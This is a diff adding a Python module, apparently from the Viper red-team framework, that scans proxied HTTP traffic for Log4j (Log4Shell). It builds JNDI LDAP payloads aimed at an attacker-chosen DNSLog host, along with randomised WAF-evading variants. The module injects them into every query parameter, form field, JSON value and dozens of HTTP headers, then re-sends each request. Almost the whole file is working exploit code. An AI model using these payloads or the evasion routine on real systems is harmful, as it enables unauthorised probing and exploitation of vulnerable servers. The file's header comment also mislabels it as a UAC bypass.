@@ -1,0 +1,222 @@
+# -*- coding: utf-8 -*-
+# @File  : PostMulitMsfBypassUAC.py
+# @Date  : 2019/3/15
+# @Desc  :
+
+import ipaddress
+import json
+import uuid
+
+from Lib.ModuleAPI import *
+from Lib.api import is_json
+from Lib.api import random_str, random_int
+from PostModule.Handle.proxyhttpscan import ProxyResponse, ProxyRequest
+
+
+class JsonReplace(object):
+    def __init__(self):
+        pass
+
+    def replace_inter(self, dic, changeData):
+        if isinstance(dic, dict):
+            return self.replace_dict(dic, changeData)  # 传入数据的value值是字典，则直接调用自身，将value作为字典传进来
+        elif isinstance(dic, list):
+            return self.replace_dict(dic, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
+        elif isinstance(dic, str):
+            return changeData
+        elif isinstance(dic, bytes):
+            return changeData.encode()
+        else:
+            return dic
+
+    # 替换请求参数
+    def replace_dict(self, dic, changeData):
+        """
+        dic：目标字典
+        changeData：替换值
+        """
+        for key in dic:  # 传入数据不符合则对其value值进行遍历
+            value = dic[key]
+            if isinstance(value, dict):
+                dic[key] = self.replace_dict(value, changeData)  # 传入数据的value值是字典，则直接调用自身，将value作为字典传进来
+            elif isinstance(value, list):
+                dic[key] = self.replace_list(value, changeData)  # 传入数据的value值是列表或者元组，则调用_get_value
+            elif isinstance(value, str):
+                dic[key] = changeData
+            elif isinstance(value, bytes):
+                dic[key] = changeData.encode()
+
+        return dic
+
+    # 替换参数子方法
+    # 数据类型判断,遍历后分别调用不用的方法
+    def replace_list(self, val, changeData):
+        for index in range(len(val)):
+            val_ = val[index]
+            if isinstance(val_, dict):
+                val[index] = self.replace_dict(val_, changeData)  # 传入数据的value值是字典，则调用replace_target_Value
+            elif isinstance(val_, list):
+                val[index] = self.replace_list(val_, changeData)  # 传入数据的value值是列表或者元组，则调用自身
+            elif isinstance(val_, str):
+                val[index] = changeData
+            elif isinstance(val_, bytes):
+                val[index] = changeData.encode()
+        return val
+
+
+class Payload(object):
+    def __init__(self):
+        pass
+
+    def is_ip_port(self, dnslog_base):
+        try:
+            ip_port = dnslog_base.split(":")
+            port = int(ip_port[1])
+            if port < 0 or port > 65535:
+                return False
+            ip = ipaddress.IPv4Address(ip_port[0])
+            return True
+        except Exception as E:
+            return False
+
+    def bypass_waf_payload(self, raw_payload):
+        new_payload = ""
+        for one_raw in raw_payload:
+            one_format = ""
+            for i in range(random_int(3)):
+                one_format = f"{one_format}{random_str(random_int(3))}:"
+            one_new = f"${{{one_format}-{one_raw}}}"
+            new_payload = f"{new_payload}{one_new}"
+        return new_payload
+
+    def get_payload_list(self, req_uuid, dnslog_base):
+        if self.is_ip_port(dnslog_base):
+            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}"
+            bypass_payload = self.bypass_waf_payload(raw_payload)
+        else:
+            raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
+            bypass_payload = self.bypass_waf_payload(raw_payload)
+        return [f"${{{raw_payload}}}", f"${{{bypass_payload}}}"]
+
+
+class PostModule(ProxyHttpScanModule):
+    NAME_ZH = "Log4j"
+    DESC_ZH = "Log4j scan"
+
+    NAME_EN = "Log4j"
+    DESC_EN = "Log4j scan"
+    MODULETYPE = TAG2TYPE.Proxy_Http_Scan
+    README = [""]
+    REFERENCES = [""]
+    AUTHOR = ["Viper"]
+    OPTIONS = register_options([
+        OptionStr(name='DNSLOG',
+                  tag_zh="DNSLOG主域名", desc_zh="DNSLog主域名,例如:9fppts.ceye.io",
+                  tag_en="DNSLOG Domain", desc_en="DNSLog Domain,e.g.:9fppts.ceye.io"),
+        OptionBool(name='ScanHeader',
+                   tag_zh="扫描Headers", desc_zh="是否在Headers中添加payload",
+                   tag_en="Scan Headers", desc_en="Add payload to http headers")
+    ])
+
+    def __init__(self, custom_param):
+        super().__init__(custom_param)
+        self.headers = ['Referer', 'X-Api-Version', 'Accept-Charset', 'Accept-Datetime', 'Accept-Encoding',
+                        'Accept-Language', 'Cookie', 'Forwarded', 'Forwarded-For', 'Forwarded-For-Ip',
+                        'Forwarded-Proto', 'From', 'TE', 'True-Client-IP', 'Upgrade', 'User-Agent', 'Via', 'Warning',
+                        'X-Api-Version', 'Max-Forwards', 'Origin', 'Pragma', 'DNT', 'Cache-Control', 'X-Att-Deviceid',
+                        'X-ATT-DeviceId', 'X-Correlation-ID', 'X-Csrf-Token', 'X-CSRFToken', 'X-Do-Not-Track', 'X-Foo',
+                        'X-Foo-Bar', 'X-Forwarded', 'X-Forwarded-By', 'X-Forwarded-For', 'X-Forwarded-For-Original',
+                        'X-Forwarded-Host', 'X-Forwarded-Port', 'X-Forwarded-Proto', 'X-Forwarded-Protocol',
+                        'X-Forwarded-Scheme', 'X-Forwarded-Server', 'X-Forwarded-Ssl', 'X-Forwarder-For',
+                        'X-Forward-For', 'X-Forward-Proto', 'X-Frame-Options', 'X-From', 'X-Geoip-Country',
+                        'X-Http-Destinationurl', 'X-Http-Host-Override', 'X-Http-Method', 'X-Http-Method-Override',
+                        'X-HTTP-Method-Override', 'X-Http-Path-Override', 'X-Https', 'X-Htx-Agent', 'X-Hub-Signature',
+                        'X-If-Unmodified-Since', 'X-Imbo-Test-Config', 'X-Insight', 'X-Ip', 'X-Ip-Trail',
+                        'X-ProxyUser-Ip', 'X-Requested-With', 'X-Request-ID', 'X-UIDH', 'X-Wap-Profile', 'X-XSRF-TOKEN']
+        self.headers_index = 0
+        self.payload = Payload()
+
+    def payload_list(self, req_uuid):
+        if self.param("DNSLOG") is None:
+            return []
+        payloads = Payload().get_payload_list(req_uuid, self.param("DNSLOG"))
+        return payloads
+
+    def get_header(self):
+        index = self.headers_index % len(self.headers)
+        self.headers_index += 1
+        return self.headers[index]
+
+    def check(self):
+        """执行前的检查函数"""
+        return True, ""
+
+    def callback(self, request: ProxyRequest, response: ProxyResponse, data=None):
+        # data,额外需要传输的数据
+        # 调用父类函数存储结果(必须调用)
+        req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
+        payloads = self.payload_list(req_uuid)
+        uuid_data = {
+            "UUID": req_uuid,
+            "TAG": "PROXY_HTTP_LOG4J2",
+            "LEVEL": "INFO",
+            "DATA": {},
+        }
+        if request.method == "GET":
+            if request.query:
+
+                uuid_data["DATA"] = {
+                    "method": "GET",
+                    "url": request.pretty_url,
+                }
+                UUIDJson.store_uuid_json(uuid_data)
+
+                for payload in payloads:
+                    for key in request.query:
+                        request.query[key] = payload
+                    result = request.send()
+        elif request.method == "POST":
+            if request.urlencoded_form:
+
+                uuid_data["DATA"] = {
+                    "method": "GET",
+                    "url": request.pretty_url,
+                }
+                UUIDJson.store_uuid_json(uuid_data)
+
+                for payload in payloads:
+                    for key in request.urlencoded_form:
+                        request.urlencoded_form[key] = payload
+                    result = request.send()
+            else:
+                if is_json(request.text):
+                    uuid_data["DATA"] = {
+                        "method": "POST",
+                        "url": request.pretty_url,
+                        "json": request.text,
+                    }
+                    UUIDJson.store_uuid_json(uuid_data)
+                    for payload in payloads:
+                        old_dict = json.loads(request.text)
+                        new_dict = JsonReplace().replace_inter(old_dict, payload)
+                        request.text = json.dumps(new_dict)
+                        result = request.send()
+
+        if self.param("ScanHeader"):
+            req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
+            payloads = self.payload_list(req_uuid)
+            uuid_data = {
+                "UUID": req_uuid,
+                "TAG": "PROXY_HTTP_LOG4J2",
+                "LEVEL": "INFO",
+                "DATA": {
+                    "method": "HEADER",
+                    "url": request.pretty_url,
+                }
+            }
+            UUIDJson.store_uuid_json(uuid_data)
+            for payload in payloads:
+                for key in request.headers:
+                    request.headers[key] = payload
+                result = request.send()
+        return True
